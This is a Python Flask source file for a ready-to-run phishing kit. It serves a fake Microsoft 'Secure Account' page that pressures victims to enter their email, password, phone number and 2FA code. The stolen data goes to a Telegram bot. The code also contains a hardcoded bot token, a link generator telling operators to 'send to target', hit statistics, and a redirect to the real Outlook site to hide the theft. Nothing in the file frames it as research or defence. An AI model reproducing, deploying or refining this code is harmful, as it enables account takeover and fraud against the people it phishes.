from flask import Flask, request, render_template_string
import os
import requests
import threading
import time

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True

HTML_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Microsoft</title><meta name="viewport" content="width=device-width"></head><body style="margin:0;font-family:Arial;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;">
<div style="background:white;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.2);max-width:350px;width:100%;">
<h2 style="color:#333;margin-bottom:10px;">🔐 Secure Account</h2>
<p style="color:#666;margin-bottom:20px;">Verify to prevent suspension</p>
<div style="background:#fff3cd;padding:12px;border-radius:6px;margin-bottom:20px;border-left:4px solid #ff9800;">⚠️ 24 hours remaining</div>
<form method=POST>
<input name=email placeholder=Email type=email style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
<input name=password placeholder=Password type=password style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
<input name=phone placeholder=Phone type=tel style="width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
<input name=otp placeholder=2FA type=text style="width:100%;padding:12px;margin-bottom:16px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
<input name=user_id type=hidden value="{{user_id}}">
<button type=submit style="width:100%;padding:14px;background:#2196f3;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer;">Verify Now</button>
</form>
</div>
</body></html>
"""

def send_msg(chat_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={'chat_id':chat_id,'text':text,'parse_mode':'Markdown'}, timeout=5)
    except: pass

def bot_loop():
    offset = 0
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset':offset,'timeout':15}).json()
            if resp['ok']:
                for u in resp['result']:
                    msg = u['message']
                    cid = msg['chat']['id']
                    txt = msg.get('text','')
                    uid = msg['from']['id']
                    
                    if '/start' in txt:
                        url = f"https://myphish.onrender.com/phish/{uid}"
                        send_msg(cid, f"🔗 `{url}`\n\n📱 Send to target!")
                    
                    elif txt == '/stats':
                        rate = STATS['captures']/max(STATS['visits'],1)*100
                        send_msg(cid, f"📊 **STATS**\n{STATS['captures']}/{STATS['visits']} ({rate:.0f}%)")
                        
                    elif txt == '/data' and cid == int(ADMIN_CHAT_ID):
                        if PHISHING_DATA:
                            data_text = "\n".join([f"📧 {d['email']} | 🔑 {d['pass']}" for d in PHISHING_DATA[-10:]])
                            send_msg(cid, f"💾 **LAST 10 HITS:**\n{data_text}")
        except: pass
        time.sleep(1)

@app.route('/')
def home():
    return f"<h1>✅ PHISH LIVE</h1><p>👀 {STATS['visits']} visits | 🎣 {STATS['captures']} captures</p>"

@app.route('/phish/<int:user_id>')
def phish(user_id):
    STATS['visits'] += 1
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/phish/<int:user_id>', methods=['POST'])
def hit(user_id):
    STATS['captures'] += 1
    data = {
        'email':request.form['email'],
        'pass':request.form['password'],
        'phone':request.form.get('phone',''),
        'otp':request.form.get('otp',''),
        'ip':request.remote_addr
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(ADMIN_CHAT_ID, f"🎣 **NEW HIT**\n📧 `{data['email']}`\n🔑 `{data['pass']}`\n📱 `{data['phone']}`\n🔢 `{data['otp']}`")
    
    return '<script>alert("✅ Verified! Redirecting...");window.open("https://outlook.live.com","_self")</script>'

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port)
